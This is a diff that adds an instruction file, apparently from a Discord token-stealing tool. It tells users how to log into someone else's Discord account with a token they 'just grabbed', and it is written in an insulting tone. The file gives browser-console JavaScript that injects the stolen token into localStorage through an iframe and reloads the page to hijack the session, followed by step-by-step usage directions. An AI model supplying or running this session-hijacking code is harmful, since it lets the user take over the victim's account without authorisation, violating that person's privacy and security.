@@ -1,0 +1,31 @@
+So uhh since yall are stupid this is how you use the token you just grabbed 
+
+
+
+=========================================================================================================
+First go to discord login (Preferably on the website.)
+Execute: CTRL+SHIFT+I
+Click on console
+=========================================================================================================
+=========================================================================================================
+When in Console, paste the below syntax, and then press ENTER afterwards.
+=========================================================================================================
+ 
+function login(token) {
+setInterval(() => {
+document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
+}, 50);
+setTimeout(() => {
+location.reload();
+}, 2500);
+}
+ 
+=========================================================================================================
+Once you've pressed ENTER, and you're in the second syntax, copy and paste the below text in your second
+syntax, but replace TOKEN below with the account token. Ex: login('A random token')
+=========================================================================================================
+login('token')
+         ↑ 
+thats where you put the token dumbass alos only type done when you have finished copy and pasting the steps above this and have pressed enter
+when done typing this just press enter dont be mentally disabled  
+
